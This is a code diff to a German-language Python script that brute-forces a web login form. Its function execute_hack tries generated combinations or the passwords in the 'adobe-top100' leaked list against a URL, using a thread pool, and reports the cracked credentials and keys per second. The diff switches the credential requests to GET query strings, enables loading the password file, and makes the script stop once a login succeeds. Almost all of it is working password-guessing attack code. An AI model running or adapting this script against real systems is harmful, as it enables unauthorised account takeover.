@@ -3,13 +3,9 @@ import itertools
 import requests
 from multiprocessing.dummy import Pool as ThreadPool
 import time
-from threading import Lock
-
-lock = Lock()
-
-pool = ThreadPool(int(input('Wähle eine Pool Größe für die Multithreads: ')))
+pool_size = int(input('Pool-Größe: '))
+pool = ThreadPool(pool_size)
 user_input = input('Nutzername: ')
-user_array = ['bob', 'ute', 'paul']
 combination_array = []
 session = requests.Session()
 combined = []
@@ -57,13 +53,9 @@ def execute_hack(x):
     combinations = combination_array
     global test_key_counter
     if user_input == 'joe':
-        print('Key: ' + passwords[x])
-        data = {
-            'benutzername': user_input,
-            'passwort': passwords[x]
-        }
-        r = session.post(url, data=data, stream=True)
-        #test_key_counter.append('k')
+        local_url = url + 'benutzername=' + user_input + '&passwort=' + passwords[x]
+        r = session.get(local_url)
+        test_key_counter.append('k')
         if r.text != 'Benutzername oder Passwort falsch!':
             print('Versuchsnummer: ' + str(x))
             print(user_input + ' ' + passwords[x])
@@ -72,17 +64,12 @@ def execute_hack(x):
             print('Gebrauchte Zeit zum Knacken: ' + str(elapsed_time))
             print('Getestete Keys pro Sekunde: ' + str(len(test_key_counter)/elapsed_time))
             print('Getestete Keys: ' + str(len(test_key_counter)))
+            raise SystemExit(0)
 
     else:
 
-        data = {
-            'benutzername': user_input,
-            'passwort': ''.join(combinations[x])
-        }
-        r = session.post(url, data=data, stream=True)
-        #lock.acquire()
-        #print('Key: ' + ''.join(combinations[x]) + '\r')
-        #lock.release()
+        local_url = url + 'benutzername=' + user_input + '&passwort=' + ''.join(combinations[x])
+        r = session.get(local_url)
         test_key_counter.append('k')
         if r.text != 'Benutzername oder Passwort falsch!':
             print('Versuchsnummer: ' + str(x))
@@ -93,8 +80,8 @@ def execute_hack(x):
             print('Getestete Keys pro Sekunde: ' + str(len(test_key_counter)/elapsed_time))
             print('Getestete Keys pro Sekunde: ' + str(x / elapsed_time))
             print('Getestete Keys: ' + str(len(test_key_counter)))
+            raise SystemExit(0)
 
-    #print(len(test_key_counter))
 
 
 if user_input != 'joe':
@@ -111,15 +98,14 @@ if user_input != 'joe':
     #combine_profil(user_array, combination_array)
 
 
-#execute_hack(combination_array)
 passwords = []
 f = open('adobe-top100.txt', 'r')
-#for line in f:
-#    line = line.strip()
-#    columns = line.split()
-#    passwords.append(columns[3])
+for line in f:
+    line = line.strip()
+    columns = line.split()
+    passwords.append(columns[3])
 
-#f.close()
+f.close()
 start_time = time.time()
 
 if user_input == 'joe':
